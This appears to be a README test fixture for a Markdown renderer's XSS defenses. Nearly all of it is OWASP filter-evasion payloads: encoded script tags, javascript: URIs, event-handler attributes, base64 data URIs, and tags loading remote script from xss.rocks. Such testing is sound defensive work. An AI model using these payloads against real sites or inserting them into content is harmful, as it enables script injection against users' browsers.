## XSS testing

The pages in this dir try to smuggle script execution into the stuff
rendered in your browser in various ways.

Unfortunately there are a LOT of ways modern browsers will let you do
that.  Here we try a bunch of them and see if we are successful in
defeating them.  The attack methods came from

https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet

You should not get any alert popups on this page.

This page is checking highlight.js rendering for C.

<<<

https://" onmouseover="<script>alert('xss/README.md: onmouseover in anonymous link')</script>"
<script>alert("xss/README.md: trivial script");</script>

x <a name="n"
href="javascript:alert('xss/README.md: js in a href')">click me</a>

## <script>alert("xss/README.md: trivial script in header");</script>
## javascript:alert('xss/README.md: js: in header')

javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
<SCRIPT SRC=//xss.rocks/.j>
<IMG SRC="javascript:alert('XSS')"
<iframe src=http://xss.rocks/scriptlet.html <
\";alert('XSS');//
</script><script>alert('XSS');</script>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<IMG SRC='vbscript:msgbox("XSS")'>
<svg/onload=alert('XSS')>
Set.constructor`alert\x28document.domain\x29```

<BODY ONLOAD=alert('XSS')>

<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<XSS STYLE="xss:expression(alert('XSS'))">

¼script¾alert(¢XSS¢)¼/script¾

<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">

<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<!--[if gte IE 4]>
 <SCRIPT>alert('XSS');</SCRIPT>
 <![endif]-->

 <OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>

<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>


<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
</BODY></HTML>

 <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-

<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
<script>alert("xss");</script>
%3Cscript>alert("xss");</script>
&ltscript>alert("xss");</script>
&lt;script>alert("xss");</script>
&LTscript>alert("xss");</script>
&LT;script>alert("xss");</script>
&#60script>alert("xss");</script>
&#060script>alert("xss");</script>
&#0060script>alert("xss");</script>
&#00060script>alert("xss");</script>
&#000060script>alert("xss");</script>
&#0000060script>alert("xss");</script>
&#60;script>alert("xss");</script>
&#060;script>alert("xss");</script>
&#0060;script>alert("xss");</script>
&#00060;script>alert("xss");</script>
&#000060;script>alert("xss");</script>
&#0000060;script>alert("xss");</script>
&#x3cscript>alert("xss");</script>
&#x03cscript>alert("xss");</script>
&#x003cscript>alert("xss");</script>
&#x0003cscript>alert("xss");</script>
&#x00003cscript>alert("xss");</script>
&#x000003cscript>alert("xss");</script>
&#x3c;script>alert("xss");</script>
&#x03c;script>alert("xss");</script>
&#x003c;script>alert("xss");</script>
&#x0003c;script>alert("xss");</script>
&#x00003c;script>alert("xss");</script>
&#x000003c;script>alert("xss");</script>
&#X3cscript>alert("xss");</script>
&#X03cscript>alert("xss");</script>
&#X003cscript>alert("xss");</script>
&#X0003cscript>alert("xss");</script>
&#X00003cscript>alert("xss");</script>
&#X000003cscript>alert("xss");</script>
&#X3c;script>alert("xss");</script>
&#X03c;script>alert("xss");</script>
&#X003c;script>alert("xss");</script>
&#X0003c;script>alert("xss");</script>
&#X00003c;script>alert("xss");</script>
&#X000003c;script>alert("xss");</script>
&#x3Cscript>alert("xss");</script>
&#x03Cscript>alert("xss");</script>
&#x003Cscript>alert("xss");</script>
&#x0003Cscript>alert("xss");</script>
&#x00003Cscript>alert("xss");</script>
&#x000003Cscript>alert("xss");</script>
&#x3C;script>alert("xss");</script>
&#x03C;script>alert("xss");</script>
&#x003C;script>alert("xss");</script>
&#x0003C;script>alert("xss");</script>
&#x00003C;script>alert("xss");</script>
&#x000003C;script>alert("xss");</script>
&#X3Cscript>alert("xss");</script>
&#X03Cscript>alert("xss");</script>
&#X003Cscript>alert("xss");</script>
&#X0003Cscript>alert("xss");</script>
&#X00003Cscript>alert("xss");</script>
&#X000003Cscript>alert("xss");</script>
&#X3C;script>alert("xss");</script>
&#X03C;script>alert("xss");</script>
&#X003C;script>alert("xss");</script>
&#X0003C;script>alert("xss");</script>
&#X00003C;script>alert("xss");</script>
&#X000003C;script>alert("xss");</script>
\x3cscript>alert("xss");</script>
\x3Cscript>alert("xss");</script>
\u003cscript>alert("xss");</script>
\u003Cscript>alert("xss");</script>

